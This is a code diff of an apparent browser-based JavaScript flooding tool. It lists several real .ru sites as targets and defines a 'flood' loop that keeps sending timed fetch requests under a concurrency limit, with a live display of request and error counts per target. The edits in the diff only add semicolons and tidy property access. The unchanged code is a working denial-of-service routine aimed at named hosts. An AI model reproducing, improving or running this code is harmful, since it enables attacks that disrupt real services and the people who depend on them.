@@ -383,7 +383,7 @@
             'https://ca.kamgov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://mascom-it.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://cfmc.ru': { number_of_requests: 0, number_of_errored_responses: 0 }
-        }
+        };
 
         // initialize variables
         var urls = Object.keys(targets);
@@ -423,7 +423,7 @@
         async function flood(target, n) {
             while (attack) {
                 if (queue.length > CONCURRENCY_LIMIT) {
-                    await queue.shift()
+                    await queue.shift();
                 }
                 queue.push(
                     fetchWithTimeout(target, { timeout: 2000 })
@@ -444,7 +444,7 @@
                         .finally(function() {
                             updateTargetDisplay(n);
                         })
-                )
+                );
             }
         }
 
@@ -454,9 +454,9 @@
             var target = targets[url];
             var cell = document.querySelector("#target" + n.toString());
             var display = "<h4>" + url + "</h4>";
-            display += "<table class='status'>"
-            display += "<tr><td>requests:</td><td>" + target["number_of_requests"] + "</td></tr>";
-            display += "</tr><td>errors:</td><td>" + target["number_of_errored_responses"] + "</td></tr>";
+            display += "<table class='status'>";
+            display += "<tr><td>requests:</td><td>" + target.number_of_requests + "</td></tr>";
+            display += "</tr><td>errors:</td><td>" + target.number_of_errored_responses + "</td></tr>";
             display += "</table>";
             cell.innerHTML = display;
         }
